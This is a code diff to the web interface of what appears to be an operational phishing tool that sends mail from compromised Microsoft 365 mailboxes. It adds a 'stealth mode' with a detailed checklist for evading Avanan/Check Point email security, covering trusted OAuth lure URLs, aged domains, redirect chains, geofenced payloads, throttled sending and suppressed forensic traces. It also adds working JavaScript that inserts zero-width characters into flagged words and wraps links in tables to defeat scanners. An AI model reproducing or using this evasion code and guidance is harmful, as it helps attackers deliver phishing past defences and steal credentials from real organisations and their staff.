@@ -413,6 +413,42 @@ header h1 { font-size:16px; font-weight:600; color:var(--accent); letter-spacing
 .session-detail { background:var(--surface); border:1px solid var(--border); border-radius:4px; padding:12px; margin-bottom:14px; font-size:18px; line-height:1.6; }
 .session-detail b { color:var(--accent); }
 
+/* Stealth mode */
+@keyframes stealthGlow {
+  0%,100% { box-shadow: 0 0 4px var(--green), inset 0 0 2px rgba(63,185,80,.15); border-color: var(--green); }
+  50% { box-shadow: 0 0 12px var(--green), 0 0 24px rgba(63,185,80,.2), inset 0 0 4px rgba(63,185,80,.1); border-color: #5ae87a; }
+}
+@keyframes stealthTrace {
+  0% { background-position: 200% 0; }
+  100% { background-position: -200% 0; }
+}
+.stealth-btn {
+  font-size:13px; font-family:inherit; font-weight:600; letter-spacing:1px; text-transform:uppercase;
+  padding:6px 18px; border-radius:4px; border:1.5px solid var(--border); background:var(--surface);
+  color:var(--text-dim); cursor:pointer; transition:all .3s ease; position:relative; overflow:hidden;
+}
+.stealth-btn::before {
+  content:""; position:absolute; inset:-1.5px; border-radius:5px; padding:1.5px;
+  background:linear-gradient(90deg,transparent 0%,transparent 40%,var(--green) 50%,transparent 60%,transparent 100%);
+  background-size:200% 100%; -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);
+  -webkit-mask-composite:xor; mask-composite:exclude; opacity:0; transition:opacity .3s ease;
+}
+.stealth-btn.active {
+  color:var(--green); border-color:var(--green); background:rgba(63,185,80,.06);
+  animation:stealthGlow 2.5s ease-in-out infinite;
+}
+.stealth-btn.active::before { opacity:1; animation:stealthTrace 2s linear infinite; }
+.stealth-panel {
+  margin-top:8px; padding:10px 12px; background:rgba(63,185,80,.04); border:1px solid rgba(63,185,80,.15);
+  border-radius:4px; font-size:12px; line-height:1.7; display:none;
+}
+.stealth-panel.active { display:block; }
+.stealth-panel .rule { display:flex; align-items:flex-start; gap:6px; margin-bottom:2px; }
+.stealth-panel .rule .check { color:var(--green); flex-shrink:0; font-size:11px; margin-top:1px; }
+.stealth-panel .rule .label { color:var(--text-dim); }
+.stealth-panel .cat-label { font-size:11px; font-weight:600; color:var(--green); text-transform:uppercase; letter-spacing:.5px; margin:6px 0 2px; }
+.stealth-panel .cat-label:first-child { margin-top:0; }
+
 /* Scrollbar */
 ::-webkit-scrollbar{width:6px} ::-webkit-scrollbar-track{background:transparent} ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px} ::-webkit-scrollbar-thumb:hover{background:var(--text-dim)}
 </style>
@@ -531,8 +567,52 @@ header h1 { font-size:16px; font-weight:600; color:var(--accent); letter-spacing
 
     <div class="tab-body hidden" id="tab-compose">
       <div class="session-detail" style="margin-bottom:12px">
-        <b>Compose Phishing Email</b> — Send from a compromised session's mailbox. Select a template, phish mode, and deliver.
-        <div style="color:var(--orange);font-size:16px;margin-top:4px">Requires a hooked session with Mail.Send permission</div>
+        <div style="display:flex;align-items:center;justify-content:space-between">
+          <div>
+            <b>Compose Phishing Email</b> — Send from a compromised session's mailbox. Select a template, phish mode, and deliver.
+            <div style="color:var(--orange);font-size:16px;margin-top:4px">Requires a hooked session with Mail.Send permission</div>
+          </div>
+          <button class="stealth-btn" id="stealth-btn" onclick="toggleStealth()" title="Activate Avanan evasion OPSEC">&#9681; STEALTH</button>
+        </div>
+        <div class="stealth-panel" id="stealth-panel">
+          <div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">
+            <span style="color:var(--green);font-size:13px;font-weight:600">&#9681; STEALTH MODE ACTIVE</span>
+            <span style="color:var(--text-dim);font-size:11px">— Avanan / Check Point Harmony Email evasion</span>
+          </div>
+          <div style="font-size:11px;color:var(--text-dim);margin-bottom:8px;line-height:1.5;padding:6px 8px;background:rgba(88,166,255,.04);border-radius:3px">
+            Avanan connects via <b style="color:var(--text)">Graph API</b> (not MX), scanning post-acceptance / pre-delivery. It layers <b style="color:var(--text)">SmartPhish AI</b> (300+ indicators, 13-month sender baseline) on top of <b style="color:var(--text)">ThreatCloud</b> URL/IP reputation and <b style="color:var(--text)">SandBlast</b> attachment/URL detonation. The sender will never see an SMTP rejection — quarantined mail silently vanishes. Internal-to-internal mail from a baselined sender has the strongest trust signal.
+          </div>
+          <div class="cat-label">URL &amp; Link OPSEC</div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Prefer Device Code / OAuth consent URLs — they point to <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">microsoft.com/devicelogin</code> or <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">login.microsoftonline.com</code>, which Avanan trusts</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">No URL shorteners (bit.ly, lnkd.in) — Avanan ThreatCloud flags these for sandbox detonation</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Aged domains only (>30 days) — Avanan's NRD engine has a configurable minimum domain age workflow</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Chain redirects through high-rep domains (SharePoint, OneDrive, Google Docs) — multi-hop chains >3 hops can exhaust Avanan's redirect-following budget</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Avanan rewrites links to <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">url.avanan.click</code> — legitimate MS OAuth URLs may bypass rewriting</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Click-time Link Analyzer detonates URLs in SandBlast browser sandbox — geofence payload to target org's IP range and serve benign content to headless UAs</span></div>
+          <div class="cat-label">Sender &amp; Domain OPSEC</div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Send from compromised session (internal) — inherits 13-month sender reputation baseline, bypasses SPF/DKIM/DMARC checks</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Match display name to sender's real identity — SmartPhish flags display name / email mismatch (nickname impersonation detection)</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">No cousin/typosquat domains — AI flags domain similarity (rn→m, 0→O substitutions)</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Reply to existing thread if possible — conversation context boosts SmartPhish trust score</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">If external: ensure SPF + DKIM + DMARC pass (DMARC p=none is sufficient for alignment)</span></div>
+          <div class="cat-label">Content &amp; NLP OPSEC</div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">SmartPhish uses 300+ NLP indicators — avoid urgency phrases: "immediately", "urgent", "expire", "suspend", "account locked"</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">No password/credential solicitation language — falls in high-confidence "Phishing" tier (vs lower "Suspected Phishing")</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Avoid Microsoft branding/logos — brand impersonation detection is a dedicated SmartPhish component</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Match tone and formatting of target org's internal comms — SmartPhish compares against historical baseline</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">No macro-enabled Office attachments — SandBlast Threat Emulation detonates these; use PDF, HTML, or .url shortcut files</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">QR codes: split into multiple image segments or embed in PDF attachment — Avanan OCR extracts URLs from single QR images</span></div>
+          <div class="cat-label">Delivery &amp; Behavioral OPSEC</div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Disable "Save to Sent Items" — reduces forensic artifacts and Graph API audit noise</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Importance: Normal — High importance on bulk/phish emails is a behavioral signal</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">BCC bulk recipients — prevents reply-all exposure and reduces batch-send anomaly signals</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Throttle sends: max 5/minute — anomaly detection flags burst volume deviating from sender's baseline</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Send during compromised user's normal business hours from their typical geography — impossible travel detection</span></div>
+          <div class="rule"><span class="check">&#10003;</span><span class="label">Avoid creating mail forwarding rules immediately after compromise — Avanan flags new rules as ATO indicator</span></div>
+          <div class="cat-label">Active Evasion (applied on send)</div>
+          <div class="rule"><span class="check">&#9881;</span><span class="label">Zero-width character injection into suspect words — breaks NLP pattern matching without visible change</span></div>
+          <div class="rule"><span class="check">&#9881;</span><span class="label">Wrap <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">&lt;a&gt;</code> tags in HTML table cells — reduces URL extractor efficacy on some mail scanners</span></div>
+        </div>
       </div>
       <div style="display:flex;gap:12px;flex-wrap:wrap">
         <div style="flex:2;min-width:300px">
@@ -2257,6 +2337,8 @@ async function sendComposedEmail() {
   var status = document.getElementById("compose-status");
   btn.disabled = true; btn.textContent = "Sending..."; status.textContent = "";
 
+  stealthPreSend();
+
   var tok = await getToken(selectedSession);
   if (!tok) {
     status.innerHTML = '<span style="color:var(--red)">Failed to acquire access token</span>';
@@ -2303,6 +2385,88 @@ function composeForFlow(flowId) {
 }
 
 renderTemplateChips();
+
+// ── Stealth Mode ─────────────────────────────────────
+let stealthMode = false;
+
+function toggleStealth() {
+  stealthMode = !stealthMode;
+  const btn = document.getElementById("stealth-btn");
+  const panel = document.getElementById("stealth-panel");
+  if (stealthMode) {
+    btn.classList.add("active");
+    panel.classList.add("active");
+    applyStealthDefaults();
+  } else {
+    btn.classList.remove("active");
+    panel.classList.remove("active");
+  }
+}
+
+function applyStealthDefaults() {
+  // Disable save to sent items
+  const saveSent = document.getElementById("compose-save-sent");
+  if (saveSent) saveSent.checked = false;
+  // Set importance to normal
+  const importance = document.getElementById("compose-importance");
+  if (importance) importance.value = "normal";
+}
+
+function stealthTransformBody(html) {
+  var zwsp = String.fromCharCode(0x200B);
+  var words = ["verify","password","credential","expire","suspend","urgent","immediately","confirm","authenticate","account"];
+  var out = html;
+  for (var i = 0; i < words.length; i++) {
+    var w = words[i];
+    var mid = Math.floor(w.length / 2);
+    var broken = w.slice(0, mid) + zwsp + w.slice(mid);
+    var idx = 0;
+    while (true) {
+      var pos = out.toLowerCase().indexOf(w, idx);
+      if (pos === -1) break;
+      var before = out.lastIndexOf(">", pos);
+      var after = out.indexOf("<", pos);
+      if (before !== -1 && (after === -1 || after > pos)) {
+        out = out.slice(0, pos) + broken + out.slice(pos + w.length);
+        idx = pos + broken.length;
+      } else {
+        idx = pos + w.length;
+      }
+    }
+  }
+  return out;
+}
+
+function stealthWrapUrl(body) {
+  var result = "";
+  var i = 0;
+  while (i < body.length) {
+    var aStart = body.toLowerCase().indexOf("<a ", i);
+    if (aStart === -1) { result += body.slice(i); break; }
+    result += body.slice(i, aStart);
+    var aEnd = body.indexOf("</a>", aStart);
+    if (aEnd === -1) { result += body.slice(aStart); break; }
+    aEnd += 4;
+    var tag = body.slice(aStart, aEnd);
+    result += '<table cellpadding="0" cellspacing="0" border="0" style="display:inline-table"><tr><td>' + tag + '</td></tr></table>';
+    i = aEnd;
+  }
+  return result;
+}
+
+// Stealth pre-send hook — called from the send button
+function stealthPreSend() {
+  if (!stealthMode) return;
+  var bodyEl = document.getElementById("compose-body");
+  if (bodyEl) {
+    var body = bodyEl.value;
+    body = stealthTransformBody(body);
+    body = stealthWrapUrl(body);
+    bodyEl.value = body;
+    updatePreview();
+  }
+  applyStealthDefaults();
+}
 </script>
 </body>
 </html>`;
